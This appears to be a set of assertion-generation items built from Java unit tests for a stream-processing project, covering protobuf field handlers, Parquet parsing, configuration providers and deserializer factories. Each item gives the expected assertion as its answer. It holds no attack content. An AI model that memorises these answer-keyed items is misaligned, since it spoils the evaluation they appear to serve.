"shouldSetFieldPassedInTheBuilderAsArray() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(repeatedFieldDescriptor.getContainingType());  ArrayList<String> inputValues = new ArrayList<>(); inputValues.add(""test1""); inputValues.add(""test2"");  DynamicMessage.Builder returnedBuilder = repeatedPrimitiveHandler.transformToProtoBuilder(builder, inputValues.toArray()); List<String> outputValues = (List<String>) returnedBuilder.getField(repeatedFieldDescriptor); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } if (field.getClass().isArray()) { field = Arrays.asList((Object[]) field); } return builder.setField(fieldDescriptor, field); }"	"assertEquals(asList(""test1"", ""test2""), outputValues)"
"shouldReturnArrayOfObjectsWithTypeSameAsFieldDescriptorForPostProcessorTransform() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor);  ArrayList<Integer> inputValues = new ArrayList<>(); inputValues.add(1);  List<Object> outputValues = (List<Object>) repeatedPrimitiveHandler.transformFromPostProcessor(inputValues);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { ArrayList<Object> outputValues = new ArrayList<>(); if (field != null) { List<Object> inputValues = (List<Object>) field; PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(fieldDescriptor); for (Object inputField : inputValues) { outputValues.add(primitiveTypeHandler.transformFromPostProcessor(inputField)); } } return outputValues; }"	assertEquals(String.class, outputValues.get(0).getClass())
"shouldReturnEmptyArrayOfObjectsIfEmptyListPassedForPostProcessorTransform() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""favourite_service_provider_guids""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor);  ArrayList<Integer> inputValues = new ArrayList<>();  List<Object> outputValues = (List<Object>) repeatedPrimitiveHandler.transformFromPostProcessor(inputValues);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { ArrayList<Object> outputValues = new ArrayList<>(); if (field != null) { List<Object> inputValues = (List<Object>) field; PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(fieldDescriptor); for (Object inputField : inputValues) { outputValues.add(primitiveTypeHandler.transformFromPostProcessor(inputField)); } } return outputValues; }"	assertEquals(0, outputValues.size())
"shouldReturnEmptyArrayOfObjectsIfNullPassedForPostProcessorTransform() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""favourite_service_provider_guids""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor);  List<Object> outputValues = (List<Object>) repeatedPrimitiveHandler.transformFromPostProcessor(null);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { ArrayList<Object> outputValues = new ArrayList<>(); if (field != null) { List<Object> inputValues = (List<Object>) field; PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(fieldDescriptor); for (Object inputField : inputValues) { outputValues.add(primitiveTypeHandler.transformFromPostProcessor(inputField)); } } return outputValues; }"	assertEquals(0, outputValues.size())
"shouldReturnAllFieldsInAListOfObjectsIfMultipleFieldsPassedWithSameTypeAsFieldDescriptorForPostProcessorTransform() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor);  ArrayList<Integer> inputValues = new ArrayList<>(); inputValues.add(1); inputValues.add(2); inputValues.add(3);  List<Object> outputValues = (List<Object>) repeatedPrimitiveHandler.transformFromPostProcessor(inputValues);  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { ArrayList<Object> outputValues = new ArrayList<>(); if (field != null) { List<Object> inputValues = (List<Object>) field; PrimitiveTypeHandler primitiveTypeHandler = new PrimitiveTypeHandler(fieldDescriptor); for (Object inputField : inputValues) { outputValues.add(primitiveTypeHandler.transformFromPostProcessor(inputField)); } } return outputValues; }"	"assertEquals(asList(""1"", ""2"", ""3""), outputValues)"
"InvalidProtocolBufferException { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor);  TestBookingLogMessage goLifeBookingLogMessage = TestBookingLogMessage .newBuilder() .addMetaArray(""1"") .addMetaArray(""2"") .addMetaArray(""3"") .build(); DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestBookingLogMessage.getDescriptor(), goLifeBookingLogMessage.toByteArray());  String[] outputValues = (String[]) repeatedPrimitiveHandler.transformFromProto(dynamicMessage.getField(repeatedFieldDescriptor)); ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory.getTypeHandler(fieldDescriptor); return primitiveHandler.parseRepeatedObjectField(field); }"	"assertArrayEquals(new String[]{""1"", ""2"", ""3""}, outputValues)"
"InvalidProtocolBufferException { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor);  TestBookingLogMessage goLifeBookingLogMessage = TestBookingLogMessage .newBuilder() .addMetaArray(""1"") .addMetaArray(""2"") .addMetaArray(""3"") .build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestBookingLogMessage.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestBookingLogMessage.getDescriptor(), goLifeBookingLogMessage.toByteArray());  String[] outputValues = (String[]) repeatedPrimitiveHandler.transformFromProtoUsingCache(dynamicMessage.getField(repeatedFieldDescriptor), fieldDescriptorCache); ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory.getTypeHandler(fieldDescriptor); return primitiveHandler.parseRepeatedObjectField(field); }"	"assertArrayEquals(new String[]{""1"", ""2"", ""3""}, outputValues)"
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(repeatedFieldDescriptor); TypeInformation actualTypeInformation = repeatedPrimitiveHandler.getTypeInformation(); TypeInformation<String[]> expectedTypeInformation = ObjectArrayTypeInfo.getInfoFor(Types.STRING); ""<AssertPlaceHolder>""; }
getTypeInformation() { return PrimitiveHandlerFactory.getTypeHandler(fieldDescriptor).getArrayType(); }"	assertEquals(expectedTypeInformation, actualTypeInformation)
"shouldConvertRepeatedRowDataToJsonString() { Descriptors.FieldDescriptor repeatedFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array""); ArrayList<String> inputValues = new ArrayList<>(); inputValues.add(""test1""); inputValues.add(""test2"");  Object value = new RepeatedPrimitiveHandler(repeatedFieldDescriptor).transformToJson(inputValues); ""<AssertPlaceHolder>""; }
transformToJson(Object field) { return GSON.toJson(field); }"	"assertEquals(""[""test1"",""test2""]"", String.valueOf(value))"
"shouldReturnArrayOfPrimitiveValuesWhenTransformFromParquetIsCalledWithSimpleGroupContainingRepeatedPrimitive() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""meta_array"");  RepeatedPrimitiveHandler repeatedPrimitiveHandler = new RepeatedPrimitiveHandler(fieldDescriptor);  GroupType parquetSchema = buildMessage() .repeated(BINARY).named(""meta_array"") .named(""TestBookingLogMessage""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  simpleGroup.add(""meta_array"", ""Hello World""); simpleGroup.add(""meta_array"", ""Welcome"");  String[] actualValue = (String[]) repeatedPrimitiveHandler.transformFromParquet(simpleGroup);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { PrimitiveHandler primitiveHandler = PrimitiveHandlerFactory.getTypeHandler(fieldDescriptor); return primitiveHandler.parseRepeatedSimpleGroupField(simpleGroup); }"	"assertArrayEquals(new String[]{""Hello World"", ""Welcome""}, actualValue)"
"shouldReturnTrueForCanHandleForRepeatedRepeatedStructFieldDescriptor() { Descriptors.FieldDescriptor repeatedStructFieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""metadata""); RepeatedStructMessageHandler repeatedStructMessageHandler = new RepeatedStructMessageHandler(repeatedStructFieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE && fieldDescriptor.toProto().getTypeName().equals("".google.protobuf.Struct"") && fieldDescriptor.isRepeated(); }"	assertTrue(repeatedStructMessageHandler.canHandle())
"shouldReturnFalseForCanHandleForStructFieldDescriptor() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""profile_data""); RepeatedStructMessageHandler repeatedStructMessageHandler = new RepeatedStructMessageHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE && fieldDescriptor.toProto().getTypeName().equals("".google.protobuf.Struct"") && fieldDescriptor.isRepeated(); }"	assertFalse(repeatedStructMessageHandler.canHandle())
"shouldReturnFalseForCanHandleForMessageFieldDescriptor() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""driver_pickup_location""); RepeatedStructMessageHandler repeatedStructMessageHandler = new RepeatedStructMessageHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE && fieldDescriptor.toProto().getTypeName().equals("".google.protobuf.Struct"") && fieldDescriptor.isRepeated(); }"	assertFalse(repeatedStructMessageHandler.canHandle())
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor repeatedStructFieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""metadata""); RepeatedStructMessageHandler repeatedStructMessageHandler = new RepeatedStructMessageHandler(repeatedStructFieldDescriptor); TypeInformation actualTypeInformation = repeatedStructMessageHandler.getTypeInformation(); TypeInformation<Row[]> expectedTypeInformation = Types.OBJECT_ARRAY(Types.ROW_NAMED(new String[]{})); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.OBJECT_ARRAY(Types.ROW_NAMED(new String[]{})); }"	assertEquals(expectedTypeInformation, actualTypeInformation)
"shouldReturnNullWhenTransformFromParquetIsCalledWithAnyArgument() { Descriptors.FieldDescriptor fieldDescriptor = TestNestedRepeatedMessage.getDescriptor().findFieldByName(""metadata""); RepeatedStructMessageHandler protoHandler = new RepeatedStructMessageHandler(fieldDescriptor); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { return null; }"	assertNull(protoHandler.transformFromParquet(simpleGroup))
"shoulDProvideFileBasedConfiguration() { System.setProperty(""ConfigSource"", ""FILE""); System.setProperty(""DAGGER_CONFIG_PATH"", ""env/local.properties""); ConfigurationProviderFactory providerFactory = new ConfigurationProviderFactory(new String[]{""--key"", ""argValue""}); ConfigurationProvider provider = providerFactory.provider();  ""<AssertPlaceHolder>""; }
provider() { if (System.getProperties().containsKey(CONFIG_SOURCE)) { String configSource = System.getProperty(CONFIG_SOURCE); switch (configSource) { case ""ENVIRONMENT"": return new EnvironmentConfigurationProvider(System.getenv()); case ""ARGS"": return new CommandlineConfigurationProvider(args); case ""FILE"": return new FileConfigurationProvider(); default: throw new DaggerConfigurationException(""Config source not provided""); } } return new CommandlineConfigurationProvider(args); }"	assertThat(provider, instanceOf(FileConfigurationProvider.class))
"shouldReturnKafkaEnvVarsPositive() { Configuration configuration = new Configuration(); configuration.setString(""PATH"", ""/usr/local/bin""); configuration.setString(""SHELL"", ""/usr/local/bin/zsh""); configuration.setString(""source_kafka_config_fetch_min_bytes"", ""1""); configuration.setString(""source_kafka_config_ssl_keystore_location"", ""/home/user/.ssh/keystore""); configuration.setString(""source_kafka_config_enable_auto_commit"", ""false"");  Properties expectedEnvVars = new Properties() {{ put(""fetch.min.bytes"", ""1""); put(""ssl.keystore.location"", ""/home/user/.ssh/keystore""); put(""enable.auto.commit"", ""false""); }};  Properties actualEnvVars = KafkaEnvironmentVariables.parse(configuration);  ""<AssertPlaceHolder>""; }
parse(Configuration configuration) { Properties props = new Properties();  if (configuration == null || configuration.keySet().size() == 0) { return props; }  configuration.toMap().entrySet() .stream() .filter(e -> e.getKey().toLowerCase().startsWith(KAFKA_PREFIX)) .forEach(e -> props.setProperty(parseVarName(e.getKey()), e.getValue())); return props; }"	assertEquals(expectedEnvVars, actualEnvVars)
"shouldReturnKafkaEnvVarsNegative() { Configuration configuration = new Configuration(); configuration.setString(""PATH"", ""/usr/local/bin""); configuration.setString(""SHELL"", ""/usr/local/bin/zsh"");  Properties actualEnvVars = KafkaEnvironmentVariables.parse(configuration);  ""<AssertPlaceHolder>""; }
parse(Configuration configuration) { Properties props = new Properties();  if (configuration == null || configuration.keySet().size() == 0) { return props; }  configuration.toMap().entrySet() .stream() .filter(e -> e.getKey().toLowerCase().startsWith(KAFKA_PREFIX)) .forEach(e -> props.setProperty(parseVarName(e.getKey()), e.getValue())); return props; }"	assertTrue(actualEnvVars.isEmpty())
"shouldReturnEmptyCollectionOnNullConfiguration() { Configuration configuration = null;  Properties actualEnvVars = KafkaEnvironmentVariables.parse(configuration);  ""<AssertPlaceHolder>""; }
parse(Configuration configuration) { Properties props = new Properties();  if (configuration == null || configuration.keySet().size() == 0) { return props; }  configuration.toMap().entrySet() .stream() .filter(e -> e.getKey().toLowerCase().startsWith(KAFKA_PREFIX)) .forEach(e -> props.setProperty(parseVarName(e.getKey()), e.getValue())); return props; }"	assertTrue(actualEnvVars.isEmpty())
"shouldReturnEmptyCollectionOnEmptyConfiguration() { Configuration configuration = new Configuration();  Properties actualEnvVars = KafkaEnvironmentVariables.parse(configuration);  ""<AssertPlaceHolder>""; }
parse(Configuration configuration) { Properties props = new Properties();  if (configuration == null || configuration.keySet().size() == 0) { return props; }  configuration.toMap().entrySet() .stream() .filter(e -> e.getKey().toLowerCase().startsWith(KAFKA_PREFIX)) .forEach(e -> props.setProperty(parseVarName(e.getKey()), e.getValue())); return props; }"	assertTrue(actualEnvVars.isEmpty())
"Exception { Configuration configuration = new CommandlineConfigurationProvider(new String[]{}).get();  ""<AssertPlaceHolder>""; }
get() { System.out.println(""params from "" + CommandlineConfigurationProvider.class.getName()); ParameterTool.fromArgs(args).toMap().entrySet().stream().forEach(System.out::println); return constructParamTool(); }"	assertTrue(configuration.getParam().getConfiguration().keySet().isEmpty())
"shouldReturnJsonDeserializerWhenConfigured() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON""); when(streamConfig.getJsonSchema()).thenReturn(""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""string"", ""format"" : ""date-time"" } }, ""required"": [ ""id"", ""time"" ] }"");  DaggerDeserializer<Row> daggerDeserializer = DaggerDeserializerFactory.create(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplierMock);  ""<AssertPlaceHolder>""; }
create(StreamConfig streamConfig, Configuration configuration, StencilClientOrchestrator stencilClientOrchestrator, SerializedStatsDReporterSupplier statsDReporterSupplier) { return getDaggerDeserializerProviders(streamConfig, configuration, stencilClientOrchestrator) .stream() .filter(DaggerDeserializerProvider::canProvide) .findFirst() .orElseThrow(() -> { StatsDErrorReporter statsDErrorReporter = new StatsDErrorReporter(statsDReporterSupplier); DaggerConfigurationException ex = new DaggerConfigurationException(""No suitable deserializer could be constructed for the given stream configuration.""); statsDErrorReporter.reportFatalException(ex); return ex; }) .getDaggerDeserializer(); }"	assertTrue(daggerDeserializer instanceof JsonDeserializer)
"shouldReturnProtoDeserializerWhenConfigured() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO""); when(streamConfig.getEventTimestampFieldIndex()).thenReturn(""5""); when(streamConfig.getProtoClass()).thenReturn(""com.tests.TestMessage""); when(stencilClientOrchestrator.getStencilClient()).thenReturn(stencilClient); when(stencilClient.get(""com.tests.TestMessage"")).thenReturn(TestBookingLogMessage.getDescriptor()); when(stencilConfig.getCacheAutoRefresh()).thenReturn(false); when(stencilClientOrchestrator.createStencilConfig()).thenReturn(stencilConfig); DaggerDeserializer<Row> daggerDeserializer = DaggerDeserializerFactory.create(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplierMock);  ""<AssertPlaceHolder>""; }
create(StreamConfig streamConfig, Configuration configuration, StencilClientOrchestrator stencilClientOrchestrator, SerializedStatsDReporterSupplier statsDReporterSupplier) { return getDaggerDeserializerProviders(streamConfig, configuration, stencilClientOrchestrator) .stream() .filter(DaggerDeserializerProvider::canProvide) .findFirst() .orElseThrow(() -> { StatsDErrorReporter statsDErrorReporter = new StatsDErrorReporter(statsDReporterSupplier); DaggerConfigurationException ex = new DaggerConfigurationException(""No suitable deserializer could be constructed for the given stream configuration.""); statsDErrorReporter.reportFatalException(ex); return ex; }) .getDaggerDeserializer(); }"	assertTrue(daggerDeserializer instanceof ProtoDeserializer)
"shouldReturnSimpleGroupDeserializerWhenConfigured() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.BOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO""); when(streamConfig.getEventTimestampFieldIndex()).thenReturn(""5""); when(streamConfig.getProtoClass()).thenReturn(""com.tests.TestMessage""); when(stencilClientOrchestrator.getStencilClient()).thenReturn(stencilClient); when(stencilClient.get(""com.tests.TestMessage"")).thenReturn(TestBookingLogMessage.getDescriptor());  DaggerDeserializer<Row> daggerDeserializer = DaggerDeserializerFactory.create(streamConfig, configuration, stencilClientOrchestrator, statsDReporterSupplierMock);  ""<AssertPlaceHolder>""; }
create(StreamConfig streamConfig, Configuration configuration, StencilClientOrchestrator stencilClientOrchestrator, SerializedStatsDReporterSupplier statsDReporterSupplier) { return getDaggerDeserializerProviders(streamConfig, configuration, stencilClientOrchestrator) .stream() .filter(DaggerDeserializerProvider::canProvide) .findFirst() .orElseThrow(() -> { StatsDErrorReporter statsDErrorReporter = new StatsDErrorReporter(statsDReporterSupplier); DaggerConfigurationException ex = new DaggerConfigurationException(""No suitable deserializer could be constructed for the given stream configuration.""); statsDErrorReporter.reportFatalException(ex); return ex; }) .getDaggerDeserializer(); }"	assertTrue(daggerDeserializer instanceof SimpleGroupDeserializer)
"shouldBeAbleToProvideJsonDeserializerWhenSourceNameIsKafkaAndSchemaTypeIsJSON() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON"");  JsonDeserializerProvider provider = new JsonDeserializerProvider(streamConfig);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!COMPATIBLE_SOURCES.contains(sourceName) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertTrue(provider.canProvide())
"shouldBeAbleToProvideJsonDeserializerWhenSourceNameIsKafkaConsumerAndSchemaTypeIsJSON() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON"");  JsonDeserializerProvider provider = new JsonDeserializerProvider(streamConfig);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!COMPATIBLE_SOURCES.contains(sourceName) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertTrue(provider.canProvide())
"shouldNotProvideJsonDeserializerWhenSourceNameIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.BOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON"");  JsonDeserializerProvider provider = new JsonDeserializerProvider(streamConfig);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!COMPATIBLE_SOURCES.contains(sourceName) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertFalse(provider.canProvide())
"shouldNotProvideJsonDeserializerWhenSchemaTypeIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO"");  JsonDeserializerProvider provider = new JsonDeserializerProvider(streamConfig);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!COMPATIBLE_SOURCES.contains(sourceName) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertFalse(provider.canProvide())
"shouldReturnJsonDeserializerForSupportedSourceNameAndSchemaType() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON""); when(streamConfig.getJsonSchema()).thenReturn(""{ ""$schema"": ""https://json-schema.org/draft/2020-12/schema"", ""$id"": ""https://example.com/product.schema.json"", ""title"": ""Product"", ""description"": ""A product from Acme's catalog"", ""type"": ""object"", ""properties"": { ""id"": { ""description"": ""The unique identifier for a product"", ""type"": ""string"" }, ""time"": { ""description"": ""event timestamp of the event"", ""type"": ""string"", ""format"" : ""date-time"" } }, ""required"": [ ""id"", ""time"" ] }"");  JsonDeserializerProvider provider = new JsonDeserializerProvider(streamConfig); DaggerDeserializer<Row> daggerDeserializer = provider.getDaggerDeserializer();  ""<AssertPlaceHolder>""; }
getDaggerDeserializer() { return new JsonDeserializer(streamConfig.getJsonSchema(), streamConfig.getJsonEventTimestampFieldName()); }"	assertTrue(daggerDeserializer instanceof JsonDeserializer)
"shouldBeAbleToProvideProtoDeserializerWhenSourceNameIsKafkaAndSchemaTypeIsPROTO() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO"");  ProtoDeserializerProvider provider = new ProtoDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!COMPATIBLE_SOURCES.contains(sourceName) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertTrue(provider.canProvide())
"shouldBeAbleToProvideProtoDeserializerWhenSourceNameIsKafkaConsumerAndSchemaTypeIsPROTO() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO"");  ProtoDeserializerProvider provider = new ProtoDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!COMPATIBLE_SOURCES.contains(sourceName) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertTrue(provider.canProvide())
"shouldNotProvideProtoDeserializerWhenSourceNameIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.BOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO"");  ProtoDeserializerProvider provider = new ProtoDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!COMPATIBLE_SOURCES.contains(sourceName) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertFalse(provider.canProvide())
"shouldNotProvideProtoDeserializerWhenSchemaTypeIsUnsupported() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_SOURCE, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""JSON"");  ProtoDeserializerProvider provider = new ProtoDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
canProvide() { SourceDetails[] sourceDetailsList = streamConfig.getSourceDetails(); for (SourceDetails sourceDetails : sourceDetailsList) { SourceName sourceName = sourceDetails.getSourceName(); DataTypes inputSchemaType = DataTypes.valueOf(streamConfig.getDataType()); if (!COMPATIBLE_SOURCES.contains(sourceName) || !inputSchemaType.equals(COMPATIBLE_INPUT_SCHEMA_TYPE)) { return false; } } return true; }"	assertFalse(provider.canProvide())
"shouldReturnProtoDeserializerForSupportedSourceNameAndSchemaType() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.KAFKA_CONSUMER, SourceType.UNBOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO""); when(streamConfig.getEventTimestampFieldIndex()).thenReturn(""5""); when(streamConfig.getProtoClass()).thenReturn(""com.tests.TestMessage""); when(stencilClientOrchestrator.getStencilClient()).thenReturn(stencilClient); when(stencilConfig.getCacheAutoRefresh()).thenReturn(false); when(stencilClientOrchestrator.createStencilConfig()).thenReturn(stencilConfig); when(stencilClient.get(""com.tests.TestMessage"")).thenReturn(TestBookingLogMessage.getDescriptor());  ProtoDeserializerProvider provider = new ProtoDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator); DaggerDeserializer<Row> daggerDeserializer = provider.getDaggerDeserializer();  ""<AssertPlaceHolder>""; }
getDaggerDeserializer() { int timestampFieldIndex = Integer.parseInt(streamConfig.getEventTimestampFieldIndex()); String protoClassName = streamConfig.getProtoClass(); String rowTimeAttributeName = configuration.getString(Constants.FLINK_ROWTIME_ATTRIBUTE_NAME_KEY, Constants.FLINK_ROWTIME_ATTRIBUTE_NAME_DEFAULT); return new ProtoDeserializer(protoClassName, timestampFieldIndex, rowTimeAttributeName, stencilClientOrchestrator); }"	assertTrue(daggerDeserializer instanceof ProtoDeserializer)
"shouldBeAbleToProvideSimpleGroupDeserializerWhenSourceNameIsParquetAndSchemaTypeIsPROTO() { when(streamConfig.getSourceDetails()).thenReturn(new SourceDetails[]{new SourceDetails(SourceName.PARQUET_SOURCE, SourceType.BOUNDED)}); when(streamConfig.getDataType()).thenReturn(""PROTO"");  SimpleGroupDeserializerProvider provider = new SimpleGroupDeserializerProvider(streamConfig, configuration, stencilClientOrchestrator);  ""<AssertPlaceHolder>""; }
